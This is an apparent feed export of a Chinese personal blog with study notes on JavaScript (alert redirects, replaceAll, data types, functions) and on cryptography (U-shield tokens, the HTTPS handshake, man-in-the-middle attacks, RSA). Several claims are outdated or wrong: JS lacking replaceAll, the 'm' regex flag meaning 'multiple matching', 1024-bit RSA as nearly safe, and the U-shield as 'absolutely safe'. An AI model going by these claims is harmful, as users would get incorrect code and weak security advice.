class=&quot;love&quot;&gt;欢迎来到爱的抽奖平台！&lt;/p&gt;</span><br><span class="line">   &lt;form </span><br><span class="line">   method=&quot;post&quot; class=&quot;shuru&quot; name=&quot;shuru&quot;&gt;</span><br><span class="line">       &lt;span&gt;请输入爱的号码牌：&lt;/span&gt;</span><br><span class="line">       &lt;input type=&quot;text&quot; class=&quot;num&quot; name=&quot;num&quot;&gt;</span><br><span class="line">       &lt;input type=&quot;button&quot; class=&quot;queren&quot; onclick=&quot;hello()&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">   &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">         </span><br><span class="line">    function hello()&#123;</span><br><span class="line">        var info=1234;</span><br><span class="line">        if(document.forms[&quot;shuru&quot;][&quot;num&quot;].value==info)</span><br><span class="line">       &#123;       </span><br><span class="line">            alert(&quot;恭喜你获奖！！！&quot;);</span><br><span class="line">            window.location.href = &#x27;./baidu.html&#x27;</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line">        else</span><br><span class="line">            &#123;alert(&quot;很遗憾，您并没有获奖！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">       </span><br><span class="line">    //   var sty=document.getElementById(&quot;BU&quot;).style;</span><br><span class="line">    //   sty.backgroundColor=&quot;blue&quot;;</span><br><span class="line">    //   sty.color=&quot;red&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>遇到的问题：</strong>之前提交按钮的类型是submit,出现一直无法正常弹出新页面的情况，一直是页面找不到，改为button之后，就可以正常弹出页面了。</p><p><strong>原因：</strong></p><h2 id="2-字符串替换"><a href="#2-字符串替换" class="headerlink" title="2.字符串替换"></a>2.字符串替换</h2><p><strong>js中是没有replaceAll方法的，那么如何实现替换所有匹配的字符串呢，即在js中实现replaceAll方法：</strong></p><p><strong>1. 使用具有全局标志g的正则表达式</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var str = &quot;dogdogdog&quot;;</span><br><span class="line">var str2 = str.replace(/dog/g,&quot;cat&quot;);</span><br><span class="line">console.log(str2);</span><br></pre></td></tr></table></figure><p>实现替换全部匹配字符串，输出结果为：catcatcat。</p><p><strong>2. 使用另一种具有全局标志g的正则表达式的定义方法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var str = &quot;dogdogdog&quot;;</span><br><span class="line">var str2 = str.replace(new RegExp(&quot;dog&quot;,&quot;gm&quot;),&quot;cat&quot;);</span><br><span class="line">console.log(str2);</span><br></pre></td></tr></table></figure><p>输出结果同上例。这里g表示执行全局匹配，m表示执行多次匹配。</p><p><strong>3. 给string对象添加原型方法replaceAll()</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String.prototype.replaceAll = function(s1, s2) &#123;</span><br><span class="line">    return this.replace(new RegExp(s1, &quot;gm&quot;), s2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就可以像使用replace方法一样使用replaceAll方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var str = &quot;dogdogdog&quot;;</span><br><span class="line">var str2 = str.replaceAll(&quot;dog&quot;, &quot;cat&quot;);</span><br><span class="line">console.log(str2);</span><br></pre></td></tr></table></figure><p>参考资料：<a href="https://www.cnblogs.com/henuyuxiang/p/11609088.html">js实现replaceAll方法 - 岁月淡忘了谁 - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;h1 id=&quot;JS操作问题&quot;&gt;&lt;a href=&quot;#JS操作问题&quot; class=&quot;headerlink&quot; title=&quot;JS操作问题&quot;&gt;&lt;/a&gt;JS操作问题&lt;/h1&gt;&lt;h2 id=&quot;1-alert（）弹出框确认后，实现页面跳转&quot;&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>密码学技术原理学习（一）</title>
    <link href="http://example.com/2021/09/08/%E5%AF%86%E7%A0%81%E5%AD%A6%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2021/09/08/%E5%AF%86%E7%A0%81%E5%AD%A6%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-09-07T16:00:00.000Z</published>
    <updated>2021-09-09T12:10:56.846Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="U盾"><a href="#U盾" class="headerlink" title="U盾"></a>U盾</h1><p><strong>简介</strong>：U盾，即工商银行2003年推出并获得国家专利的客户证书USBkey，是工行提供的办理网上银行业务的高级别安全工具。它外形酷似U盘，安全性能如一面盾牌，意为U型的盾牌，所以取名曰：“U盾”。它的作用是在办理网上银行业务时保护着网上银行资金安全，规避黑客、假网站、木马病毒等各种风险。 U盾是工商银行推出并获得国家专利的客户证书USBkey，是工行为您提供的办理网上银行业务的高级别安全工具。 U盾是用于网上银行电子签名和数字认证的工具，它内置微型智能卡处理器，采用1024位非对称密钥算法对网上数据进行加密、解密和数字签名，确保网上交易的保密性、真实性、完整性和不可否认性。</p><p><strong>工作原理</strong>：</p><p>​       U盾又作移动数字证书，它存放着你个人的数字证书，并不可读取。同样，银行也记录着你的数字证书。当你尝试进行网上交易时，银行会向你发送由时间字串，地址字串，交易信息字串，防重放攻击字串组合在一起进行加密后得到的字串A，你的U盾将跟据你的个人证书对字串A进行不可逆运算得到字串B，并将字串B发送给银行，银行端也同时进行该不可逆运算，如果银行运算结果和你的运算结果一致便认为你合法，交易便可以完成，如果不一致便认为你不合法，交易便会失败。<br>　　理论上，不同的字串A不会得出相同的字串B，即一个字串A对应一个唯一的字串B；但是字串B 和字串A无法得出你的数字证书，而且U盾具有不可读取性，所以任何人都无法获行你的数字证书。并且银行每次都会发不同的防重放字串（随机字串）和时间字串，所以当一次交易完成后，刚发出的B字串便不再有效。综上所述，理论上U盾是绝对安全的。</p><p><img src="/E:/git-blog\source\images\QQ截图20210908205640.png" alt="QQ截图20210908205640"></p><h1 id="https"><a href="#https" class="headerlink" title="https"></a>https</h1><p> <strong>简介</strong>：HTTPS （全称：Hyper Text Transfer Protocol over SecureSocket Layer），是以安全为目标的 HTTP 通道，在HTTP的基础上通过传输加密和<a href="https://baike.baidu.com/item/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81/5294713">身份认证</a>保证了传输过程的安全性 [1] 。HTTPS 在HTTP 的基础下加入<a href="https://baike.baidu.com/item/SSL/320778">SSL</a>，HTTPS 的安全基础是 SSL，因此加密的详细内容就需要 SSL。 HTTPS 存在不同于 HTTP 的默认端口及一个加密/身份验证层（在 HTTP与 <a href="https://baike.baidu.com/item/TCP/33012">TCP</a> 之间）。这个系统提供了身份验证与加密通讯方法。它被广泛用于<a href="https://baike.baidu.com/item/%E4%B8%87%E7%BB%B4%E7%BD%91/215515">万维网</a>上安全敏感的通讯，例如交易支付等方面。</p><p><strong>实现原理</strong>：</p><p>① 客户端将它所支持的算法列表和一个用作产生密钥的随机数发送给服务器；</p><p>② 服务器从算法列表中选择一种加密算法，并将它和一份包含<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8/100571">服务器</a>公用密钥的证书发送给<a href="https://baike.baidu.com/item/%E5%AE%A2%E6%88%B7%E7%AB%AF/101081">客户端</a>；该证书还包含了用于认证目的的服务器标识，服务器同时还提供了一个用作产生密钥的随机数；</p><p>③ 客户端对服务器的证书进行验证（有关验证证书，可以参考<a href="https://baike.baidu.com/item/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/212550">数字签名</a>），并抽取服务器的公用密钥；然后，再产生一个称作 pre_master_secret 的随机密码串，并使用服务器的公用密钥对其进行加密（参考非对称加 / 解密），并将加密后的信息发送给服务器 ；</p><p>④ 客户端与服务器端根据 pre_master_secret 以及客户端与服务器的随机数值独立计算出加密和 <a href="https://baike.baidu.com/item/MAC/173">MAC</a>密钥（参考 DH密钥交换算法）；</p><p>⑤ 客户端将所有握手消息的 MAC 值发送给服务器；</p><p>⑥ 服务器将所有握手消息的 MAC 值发送给客户端 。</p><h1 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h1><p><strong>简介</strong>：在密码学和计算机安全领域中，中间人攻击（Man-in-the-middle attack ，缩写：MITM）是指攻击者与通讯的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容。在许多情况下这是很简单的（例如，在一个未加密的Wi-Fi 无线接入点的接受范围内的中间人攻击者，可以将自己作为一个中间人插入这个网络）。<br>       一个中间人攻击能成功的前提条件是攻击者能将自己伪装成每一个参与会话的终端，并且不被其他终端识破。中间人攻击是一个（缺乏）相互认证的攻击。大多数的加密协议都专门加入了一些特殊的认证方法以阻止中间人攻击。例如，SSL协议可以验证参与通讯的一方或双方使用的证书是否是由权威的受信任的数字证书认证机构颁发，并且能执行双向身份认证。</p><p>​      随着计算机通信网技术的不断发展，MITM攻击也越来越多样化。最初，攻击者只要将网卡设为混杂模式，伪装成<a href="https://wapbaike.baidu.com/item/%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8">代理服务器</a>监听特定的流量就可以实现攻击，这是因为很多通信协议都是以明文来进行传输的，如HTTP、FTP、Telnet等。后来，随着<a href="https://wapbaike.baidu.com/item/%E4%BA%A4%E6%8D%A2%E6%9C%BA">交换机</a>代替<a href="https://wapbaike.baidu.com/item/%E9%9B%86%E7%BA%BF%E5%99%A8">集线器</a>，简单的嗅探攻击已经不能成功，必须先进行<a href="https://wapbaike.baidu.com/item/ARP%E6%AC%BA%E9%AA%97/2805503">ARP欺骗</a>才行。如今，越来越多的服务商（网上银行，邮箱登陆）开始采用加密通信，SSL(Secure Sockets Layer <a href="https://wapbaike.baidu.com/item/%E5%AE%89%E5%85%A8%E5%A5%97%E6%8E%A5%E5%B1%82">安全套接层</a>)是一种广泛使用的技术，HTTPS、FTPS等都是建立在其基础上的。</p><p><strong>实现原理</strong>:</p><p>解释如下图：</p><p><img src="/C:/Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210908194927456.png" alt="image-20210908194927456"></p><h1 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h1><p><strong>简介</strong>：RSA<a href="https://baike.baidu.com/item/%E5%85%AC%E5%BC%80%E5%AF%86%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/11048976">公开密钥密码体制</a>是一种使用不同的加密密钥与解密密钥，“由已知加密密钥推导出解密密钥在计算上是不可行的”密码体制  。</p><p>在公开密钥密码体制中，加密密钥（即公开密钥）PK是公开信息，而解密密钥（即秘密密钥）SK是需要保密的。加密算法E和解密算法D也都是公开的。虽然解密密钥SK是由公开密钥PK决定的，但却不能根据PK计算出SK 。</p><p>正是基于这种理论，1978年出现了著名的RSA算法，它通常是先生成一对RSA密钥，其中之一是保密密钥，由用户保存；另一个为公开密钥，可对外公开，甚至可在网络服务器中注册。为提高保密强度，RSA密钥至少为500位长，一般推荐使用1024位。这就使加密的计算量很大。为减少计算量，在传送信息时，常采用传统加密方法与<a href="https://baike.baidu.com/item/%E5%85%AC%E5%BC%80%E5%AF%86%E9%92%A5%E5%8A%A0%E5%AF%86/8090774">公开密钥加密</a>方法相结合的方式，即信息采用改进的DES或IDEA对话密钥加密，然后使用RSA密钥加密对话密钥和信息摘要。对方收到信息后，用不同的密钥解密并可核对信息摘要  。RSA是被研究得最广泛的公钥算法，从提出到现在已近三十年，经历了各种攻击的考验，逐渐为人们接受，普遍认为是目前最优秀的公钥方案之一。</p><p>一般来说，512位的密钥被视为不安全的；768位的密钥不用担心受到除了国家安全管理（NSA）外的其他事物的危害；1024位的密钥几乎是安全的。RSA在一些主要产品内部都有嵌入，像 Windows、网景 Navigator、 Quicken和 Lotus Notes  。</p><p><strong>实现原理</strong>：RSA公开密钥密码体制的原理是：根据数论，寻求两个大素数比较简单，而将它们的乘积进行因式分解却极其困难，因此可以将乘积公开作为加密密钥。</p><p>RSA算法的具体描述如下： </p><p>（1）任意选取两个不同的大素数p和q计算乘积</p><p><img src="https://bkimg.cdn.bcebos.com/formula/f0dac18152076624d87832b62709895c.svg" alt="img"></p><p>（2）任意选取一个大整数e，满足</p><p><img src="https://bkimg.cdn.bcebos.com/formula/c33d8c66364a636b051d82f0ee202a36.svg" alt="img"></p><p> ，整数e用做加密钥（注意：e的选取是很容易的，例如，所有大于p和q的素数都可用） ；</p><p>（3）确定的解密钥d，满足</p><p><img src="https://bkimg.cdn.bcebos.com/formula/da8649c0078a0a842779394d64011776.svg" alt="img"></p><p> ，即</p><p><img src="https://bkimg.cdn.bcebos.com/formula/4dee3f4df52a81983db0e3c619f96058.svg" alt="img"></p><p> 是一个任意的整数；所以，若知道e和</p><p><img src="https://bkimg.cdn.bcebos.com/formula/679e809a0d964785d0aa4cfcb4218742.svg" alt="img"></p><p>，则很容易计算出d；</p><p>（4）公开整数n和e，秘密保存d；</p><p>（5）将明文m（m&lt;n是一个整数）加密成密文c，加密算法为 </p><p><img src="https://bkimg.cdn.bcebos.com/formula/5947116555169dc6fe9e3f5cdf347706.svg" alt="img"></p><p>（6）将密文c解密为明文m，解密算法为 </p><p><img src="https://bkimg.cdn.bcebos.com/formula/1a8b337167e4d4b2c23855d88ec4c67f.svg" alt="img"></p><p>然而只根据n和e（注意：不是p和q）要计算出d是不可能的。因此，任何人都可对明文进行加密，但只有授权用户（知道d）才可对密文解密 。</p><p><strong>参考资料</strong>：<a href="https://blog.csdn.net/fkedwgwy/article/details/4100522?ops_request_misc=%7B%22request_id%22:%22163107184416780262517111%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=163107184416780262517111&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-4100522.first_rank_v2_pc_rank_v29&utm_term=U%E7%9B%BE&spm=1018.2226.3001.4187">(6条消息) U盾 _潇湘博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/superfjj/article/details/103983707?ops_request_misc=%7B%22request_id%22:%22163107290216780274192738%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=163107290216780274192738&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-103983707.first_rank_v2_pc_rank_v29&utm_term=%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB&spm=1018.2226.3001.4187">(6条消息) 中间人攻击_程序那些事 -CSDN博客</a></p><p><a href="https://baike.baidu.com/item/RSA%E7%AE%97%E6%B3%95/263310">RSA算法_百度百科 (baidu.com)</a></p><p><a href="https://baike.baidu.com/item/https/285356">HTTPS_百度百科 (baidu.com)</a></p><p><a href="https://blog.csdn.net/qq_36522306/article/details/81053689?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=https&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-81053689.nonecase&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/qq_36522306/article/details/81053689?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=https&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-81053689.nonecase&amp;spm=1018.2226.3001.4187</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;h1 id=&quot;U盾&quot;&gt;&lt;a href=&quot;#U盾&quot; class=&quot;headerlink&quot; title=&quot;U盾&quot;&gt;&lt;/a&gt;U盾&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;简介&lt;/strong&gt;：U盾，即工商银行2003年推出并获得国家专利的客户</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>JavaScript学习笔记</title>
    <link href="http://example.com/2021/08/05/JavaScript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://example.com/2021/08/05/JavaScript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-08-04T16:00:00.000Z</published>
    <updated>2021-10-09T12:21:30.107Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JavaScript学习笔记"><a href="#JavaScript学习笔记" class="headerlink" title="JavaScript学习笔记"></a>JavaScript学习笔记</h1><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>类似于C语言。JavaScript 使用 Unicode 字符集，也可以使用 Base64 编码。</p><p><strong>注意：</strong>JavaScript对字母大小写敏感。</p><p>alter():浏览器弹出警示框</p><p>console.log(msg):浏览器控制台打印输出信息</p><p>prompt（info）：浏览器弹出输入框</p><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>声明变量: var age=10;</p><p><strong>注意：</strong>JavaScript 是一种动态类型语言，也就是说，变量的类型没有限制，变量可以随时更改类型。</p><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><ul><li>数值：Number (Infinity 表示无穷大，-Infinity表示无穷小，NaN表示非数值 isNaN（）判断是否是数字)</li></ul><p>发生“正向溢出”，就会返回<code>Infinity</code>。发生为“负向溢出”，这时会直接返回0。</p><p>JavaScript 提供<code>Number</code>对象的<code>MAX_VALUE</code>和<code>MIN_VALUE</code>属性，返回可以表示的具体的最大值和最小值。除了<code>Infinity</code>、<code>-Infinity</code>、<code>NaN</code>和<code>undefined</code>这几个值会返回<code>false</code>，<code>isFinite</code>对于其他的数值都会返回<code>true</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Number.MAX_VALUE // 1.7976931348623157e+308</span><br><span class="line">Number.MIN_VALUE // 5e-324</span><br></pre></td></tr></table></figure><p><code>isFinite</code>方法返回一个布尔值，表示某个值是否为正常的数值</p><p><strong>注意：</strong>JavaScript 内部，所有数字都是以64位浮点数形式储存，</p><ol><li><p>第1位：符号位，<code>0</code>表示正数，<code>1</code>表示负数</p></li><li><p>第2位到第12位（共11位）：指数部分</p></li><li><p>第13位到第64位（共52位）：小数部分（即有效数字）</p><p>精度最多只能到53个二进制位，这意味着，绝对值小于2的53次方的整数，即-253到253，都可以精确表示。</p><p>需要注意的是，<code>NaN</code>不是独立的数据类型，而是一个特殊数值，它的数据类型依然属于<code>Number</code>.<code>NaN</code>不等于任何值，包括它本身.</p></li></ol><ul><li><p>布尔值：Boolean</p></li><li><p>字符串：String，<code>length</code>属性返回字符串的长度，JavaScript 原生提供两个 Base64 相关的方法。</p><ul><li><code>btoa()</code>：任意值转为 Base64 编码</li><li><code>atob()</code>：Base64 编码转为原来的值</li></ul></li><li><p>未定义：Undefined是一个表示”此处无定义”的原始值，转为数值时为<code>NaN</code>。</p></li><li><p>空值：Null，null是一个表示“空”的对象，转为数值时为0；</p></li><li><p>Symbol:</p><p>对象是最复杂的数据类型，又可以分成三个子类型:</p></li><li><p>狭义的对象：object，关于对象的引用，如果不同的变量名指向同一个对象，那么它们都是这个对象的引用，也就是说指向同一个内存地址。修改其中一个变量，会影响到其他所有变量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var o1 = &#123;&#125;;</span><br><span class="line">var o2 = o1;</span><br><span class="line"></span><br><span class="line">o1.a = 1;</span><br><span class="line">o2.a // 1</span><br><span class="line"></span><br><span class="line">o2.b = 2;</span><br><span class="line">o1.b // 2;</span><br><span class="line"></span><br><span class="line">var x = 1;</span><br><span class="line">var y = x;</span><br><span class="line"></span><br><span class="line">x = 2;</span><br><span class="line">y // 1</span><br></pre></td></tr></table></figure><p>这种引用只局限于对象，如果两个变量指向同一个原始类型的值。那么，变量这时都是值的拷贝。</p><p><strong>查看属性</strong>：<code>Object.keys</code>方法。</p><p><strong>删除属性</strong>：<code>delete</code>命令。删除成功后返回<code>true</code>。(只能删除对象本身的属性，无法删除继承的属性)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete obj.p // true</span><br></pre></td></tr></table></figure><p><strong>判断属性是否存在</strong>：in运算符，检查的是键名，不是键值，如果包含就返回<code>true</code>，否则返回<code>false</code>。它的左边是一个字符串，表示属性名，右边是一个对象。</p><p>注意：不能识别哪些属性是对象自身的，哪些属性是继承的。可以使用对象的<code>hasOwnProperty</code>方法判断一下，是否为对象自身的属性。</p><p><strong>属性的历遍</strong>：<code>for...in</code>循环用来遍历一个对象的全部属性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var obj = &#123;a: 1, b: 2, c: 3&#125;;</span><br><span class="line"></span><br><span class="line">for (var i in obj) &#123;</span><br><span class="line">  console.log(&#x27;键名：&#x27;, i);</span><br><span class="line">  console.log(&#x27;键值：&#x27;, obj[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一般情况下，都是只想遍历对象自身的属性，所以使用<code>for...in</code>的时候，应该结合使用<code>hasOwnProperty</code>方法，在循环内部判断一下，某个属性是否为对象自身的属性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var person = &#123; name: &#x27;老张&#x27; &#125;;</span><br><span class="line"></span><br><span class="line">for (var key in person) &#123;</span><br><span class="line">  if (person.hasOwnProperty(key)) &#123;</span><br><span class="line">    console.log(key);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">// name</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：</p><ul><li>它遍历的是对象所有可遍历（enumerable）的属性，会跳过不可遍历的属性（例如<code>toString</code>属性）。</li><li>它不仅遍历对象自身的属性，还遍历继承的属性。</li></ul><p><strong>操作同一个对象的多个属性</strong>：with语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">with (document.links[0])&#123;</span><br><span class="line">  console.log(href);</span><br><span class="line">  console.log(title);</span><br><span class="line">  console.log(style);</span><br><span class="line">&#125;</span><br><span class="line">// 等同于</span><br><span class="line">console.log(document.links[0].href);</span><br><span class="line">console.log(document.links[0].title);</span><br><span class="line">console.log(document.links[0].style);</span><br></pre></td></tr></table></figure><p>注意：<code>with</code>区块没有改变作用域，它的内部依然是当前作用域。这造成了<code>with</code>语句的一个很大的弊病，就是绑定对象不明确。这非常不利于代码的除错和模块化，建议不要使用<code>with</code>语句，可以考虑用一个临时变量代替<code>with</code>。</p></li><li><p>数组：array,本质上，数组属于一种特殊的对象。数组是一种动态的数据结构，可以随时增减数组的成员。<code>typeof</code>运算符会返回数组的类型是<code>object</code>。数组的键名就是整数0、1、2。（字符串是类似数组的对象）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var arr = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;];</span><br></pre></td></tr></table></figure><ol><li><strong>length属性</strong>，还可以用这个属性进行增删操作。</li><li><strong>in运算符</strong>：</li><li><strong>for…in,for,while,forEach循环历遍数组</strong></li></ol><p>注意：使用<code>delete</code>命令删除一个数组成员，会形成空位，并且不会影响<code>length</code>属性。所以，使用<code>length</code>属性进行数组遍历，一定要非常小心。如果是空位，使用数组的<code>forEach</code>方法、<code>for...in</code>结构、以及<code>Object.keys</code>方法进行遍历，空位都会被跳过。如果某个位置是<code>undefined</code>，遍历的时候就不会被跳过。</p></li></ul><p><strong>方法：</strong>slice（），call（）</p><ul><li><p>函数(第一等公民)：function</p><p><strong>函数声明</strong>：</p><ol><li><p>function命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function print(s) &#123;</span><br><span class="line">  console.log(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>函数表达式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var print = function(s) &#123;</span><br><span class="line">  console.log(s);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>Function构造函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var add = new Function(</span><br><span class="line">  &#x27;x&#x27;,</span><br><span class="line">  &#x27;y&#x27;,</span><br><span class="line">  &#x27;return x + y&#x27;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">// 等同于</span><br><span class="line">function add(x, y) &#123;</span><br><span class="line">  return x + y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li></ul><p><strong>函数属性和方法：</strong></p><ol><li>name属性：返回函数名，还可以获取参数函数的名字。</li><li>length属性：返回函数预期传入的参数个数，即函数定义之中的参数个数。</li><li>toString():返回一个字符串，内容是函数的源码。</li><li>arguments对象（非数组）：<code>arguments</code>对象包含了函数运行时的所有参数，<code>arguments[0]</code>就是第一个参数，对象只有在函数体内部，才可以使用。通过<code>arguments</code>对象的<code>length</code>属性，可以判断函数调用时到底带几个参数。<code>arguments</code>对象带有一个<code>callee</code>属性，返回它所对应的原函数。</li></ol><p>注意：函数参数如果是原始类型的值（数值、字符串、布尔值），传递方式是传值传递（passes by value）。这意味着，在函数体内修改参数值，不会影响到函数外部。如果函数参数是复合类型的值（数组、对象、其他函数），传递方式是传址传递（pass by reference）。也就是说，传入函数的原始值的地址，因此在函数内部修改参数，将会影响到原始值。如果函数内部修改的，不是参数对象的某个属性，而是替换掉整个参数，这时不会影响到原始值。因为，形式参数（<code>o</code>）的值实际是参数<code>obj</code>的地址，重新对<code>o</code>赋值导致<code>o</code>指向另一个地址，保存在原地址上的值当然不受影响。</p><p><strong>闭包</strong>：（….）注意，外层函数每次运行，都会生成一个新的闭包，而这个闭包又会保留外层函数的内部变量，所以内存消耗很大。因此不能滥用闭包，否则会造成网页的性能问题。</p><p><strong>eval语句</strong>:<code>eval</code>命令接受一个字符串作为参数，并将这个字符串当作语句执行。</p><p><strong>注意</strong>：转换规则是除了下面六个值被转为<code>false</code>，其他值都视为<code>true</code>。</p><p><code>undefined</code>，<code>null</code>，<code>false</code>，<code>0</code>，<code>NaN</code>，<code>&quot;&quot;</code>或<code>&#39;&#39;</code>（空字符串）</p><p><strong>获取数据类型的方法：</strong></p><ul><li><code>typeof</code>运算符</li><li><code>instanceof</code>运算符</li><li><code>Object.prototype.toString</code>方法</li></ul><p><strong>类型转换方式：</strong></p><p><strong>转整数</strong>：parseInt（）<code>parseInt</code>的参数都是字符串，结果只返回字符串头部可以转为数字的部分。返回值只有两种可能，要么是一个十进制整数，要么是<code>NaN</code>。</p><p><strong>进制转换</strong>：<code>parseInt</code>方法还可以接受第二个参数（2到36之间），表示被解析的值的进制，返回该值对应的十进制数。默认情况下，<code>parseInt</code>的第二个参数为10，即默认是十进制转十进制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">parseInt(&#x27;1000&#x27;, 2) // 8</span><br><span class="line">parseInt(&#x27;1000&#x27;, 6) // 216</span><br><span class="line">parseInt(&#x27;1000&#x27;, 8) // 512</span><br></pre></td></tr></table></figure><p><strong>浮点数转化</strong>：parseFloat（）方法用于将一个字符串转为浮点数。</p><p>转String：toString(),String(),将需要转换的变量直接使用+号凭借字符串，结果就是字符串了（即隐式转换）。</p><p>转Number:parseInt(),parseFloat(),Number(),使用算术运算转换为数值型（即隐式转换）</p><p>转Boolean:Boolean()</p><p><strong>数组转字符串：</strong> 结合join()与String()函数实现。</p><p>注意数据类型是可以变化的。</p><h3 id="运算符"><a href="#运算符" class="headerlink" 